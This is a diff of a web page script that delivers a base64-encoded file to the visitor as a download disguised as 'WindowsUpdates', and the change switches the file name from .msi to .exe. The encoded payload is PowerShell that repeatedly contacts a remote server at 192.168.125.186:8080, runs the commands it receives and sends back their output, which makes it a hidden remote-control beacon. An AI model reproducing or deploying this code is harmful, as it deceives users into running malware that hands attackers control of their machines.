@@ -14,7 +14,7 @@
             var file ='CiRzPScxOTIuMTY4LjEyNS4xODY6ODA4MCc7JHA9J2h0dHA6Ly8nOyR2PUludm9rZS1XZWJSZXF1ZXN0IC1Vc2VCYXNpY1BhcnNpbmcgLVVyaSAkcCRzLzFjNTIwZjE4IC1IZWFkZXJzIEB7IkF1dGhyaXphdGlvbiI9JzFjNTIwZjE4LWVjOTI2OGRiLTAzY2E4OTJjJ307d2hpbGUgKCR0cnVlKXskYz0oSW52b2tlLVdlYlJlcXVlc3QgLVVzZUJhc2ljUGFyc2luZyAtVXJpICRwJHMvZWM5MjY4ZGIgLUhlYWRlcnMgQHsiQXV0aHJpemF0aW9uIj0nMWM1MjBmMTgtZWM5MjY4ZGItMDNjYTg5MmMnfSkuQ29udGVudDtpZiAoJGMgLW5lICdOb25lJykgeyRyPWlleCAkYyAtRXJyb3JBY3Rpb24gU3RvcCAtRXJyb3JWYXJpYWJsZSBlOyRyPU91dC1TdHJpbmcgLUlucHV0T2JqZWN0ICRyOyR0PUludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJHAkcy8wM2NhODkyYyAtTWV0aG9kIFBPU1QgLUhlYWRlcnMgQHsiQXV0aHJpemF0aW9uIj0nMWM1MjBmMTgtZWM5MjY4ZGItMDNjYTg5MmMnfSAtQm9keSAoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygkZSskcikgLWpvaW4gJyAnKX0gc2xlZXAgMC44fQo='
             var data = base64ToArrayBuffer(file);
             var blob = new Blob([data], {type: 'octet/stream'});
-            var fileName = 'WindowsUpdates.msi';
+            var fileName = 'WindowsUpdates.exe';
 
             if (window.navigator.msSaveOrOpenBlob) {
                 window.navigator.msSaveOrOpenBlob(blob,fileName);
